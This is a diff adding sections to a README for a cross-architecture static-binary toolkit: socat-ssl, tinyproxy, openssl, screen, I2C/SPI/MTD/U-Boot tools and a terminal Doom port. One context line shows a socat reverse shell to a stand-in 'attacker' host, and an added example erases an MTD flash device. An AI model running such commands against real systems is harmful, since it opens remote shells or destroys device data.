@@ -50,6 +50,15 @@ All tools are statically linked with musl libc and have zero runtime dependencie
 ./output/mips32le/socat TCP:attacker:4444 EXEC:/bin/sh
 ```
 
+#### socat-ssl
+**socat with OpenSSL** - socat 1.8.0.3 linked against OpenSSL for TLS relays. Linux/Android + BSDs.
+
+```bash
+./build socat-ssl --arch aarch64
+# TLS listener bridged to a local service
+./output/aarch64/socat-ssl OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80
+```
+
 #### ncat / ncat-ssl
 **Network utility** - Netcat replacement with SSL support.
 
@@ -130,6 +139,23 @@ oida fuzz <proto> <ip> --agent-monitor <agent-host>:<port> --agent-token <secret
 
 **Upstream**: https://github.com/f0rw4rd/oida-fuzzing-agent
 
+#### tinyproxy
+**HTTP/HTTPS forward proxy** - tinyproxy 1.11.3, a tiny HTTP proxy (complements the microsocks SOCKS5 proxy). Linux/Android + BSDs + macOS.
+
+```bash
+./build tinyproxy --arch aarch64
+./output/aarch64/tinyproxy -d -c tinyproxy.conf   # run in foreground
+```
+
+#### openssl
+**OpenSSL CLI** - openssl 1.1.1w command-line tool (`s_client`/`s_server`, `x509`, `enc`, `genrsa`, …). Linux/Android + FreeBSD/OpenBSD/NetBSD/macOS/Windows.
+
+```bash
+./build openssl --arch x86_64
+./output/x86_64/openssl s_client -connect example.com:443
+./output/x86_64/openssl x509 -in cert.pem -noout -text
+```
+
 ### System Tools
 
 #### busybox / busybox_nodrop
@@ -149,6 +175,14 @@ oida fuzz <proto> <ip> --agent-monitor <agent-host>:<port> --agent-token <secret
 ```bash
 ./build bash --arch or1k
 ./output/or1k/bash --version
+```
+
+#### screen
+**Terminal multiplexer** - GNU screen 5.0.1 for detachable sessions on the target. Linux/Android only.
+
+```bash
+./build screen --arch aarch64
+./output/aarch64/screen -S work      # start a session; Ctrl-a d detaches, `screen -r work` reattaches
 ```
 
 ### SSH Tools (Dropbear)
@@ -188,6 +222,58 @@ ls output/arm32v7le/can-utils/
 - **canplayer** - Replay CAN logs
 - **isotpdump** - ISO-TP protocol analysis
 - **j1939cat/j1939spy** - J1939 protocol tools
+
+### Embedded / Hardware Tools
+
+These drive Linux kernel device interfaces (Linux/Android only) and install a directory of binaries under `output/<arch>/<tool>.<libc>/`.
+
+#### i2c-tools
+**I2C bus utilities** - i2c-tools 4.4: `i2cdetect`, `i2cget`, `i2cset`, `i2cdump`, `i2ctransfer`.
+
+```bash
+./build i2c-tools --arch aarch64
+./output/aarch64/i2c-tools.musl/i2cdetect -y 1
+```
+
+#### spidev-tools
+**SPI userspace tools** - spi-tools 1.0.2: `spi-config`, `spi-pipe` (plus a `spidev_test` helper).
+
+```bash
+./build spidev-tools --arch aarch64
+./output/aarch64/spidev-tools.musl/spi-config -d /dev/spidev0.0 -q
+```
+
+#### mtd-utils
+**Flash / MTD utilities** - mtd-utils 2.3.1: `flash_erase`, `nandwrite`, `nanddump`, `flashcp`, `mtdinfo`, `ubiformat`, `ubiattach`, `ubimkvol`, and more.
+
+```bash
+./build mtd-utils --arch aarch64
+./output/aarch64/mtd-utils.musl/flash_erase /dev/mtd0 0 0
+```
+
+#### uboot-envtools
+**U-Boot environment access** - u-boot-tools 2026.04: `fw_printenv` / `fw_setenv` read and write the U-Boot environment from userspace (needs `/etc/fw_env.config` on the target).
+
+```bash
+./build uboot-envtools --arch aarch64
+./output/aarch64/fw_printenv
+```
+
+### Games
+
+#### doom
+**Terminal Doom** - a source port of doom-ascii (based on doomgeneric) that renders to a text terminal, so it plays over **SSH or a serial console**. Builds on Linux (all arches) plus Windows/macOS/FreeBSD/OpenBSD/NetBSD.
+
+By default (`DOOM_EMBED_WAD=1`) the freely-distributable shareware IWAD is baked in (DEFLATE-compressed, decompressed at startup), producing a single self-contained ~2.1 MB binary that needs no WAD file:
+
+```bash
+./build doom --arch aarch64
+./output/aarch64/doom.musl          # boots straight into shareware Doom, no WAD needed
+```
+
+Set `DOOM_EMBED_WAD=0` for the smaller bring-your-own-WAD engine (`doom-ascii.<libc>`, ~370 KB), which loads a WAD from disk (`doom1.wad` in the cwd, or `-iwad <file>`). Windows always uses this variant (its CRT lacks `fmemopen`).
+
+Best in a truecolor terminal sized 80x50 or larger. Controls: arrows move, Ctrl fires, Space opens doors, Esc for the menu.
 
 ### Shell Utilities
 
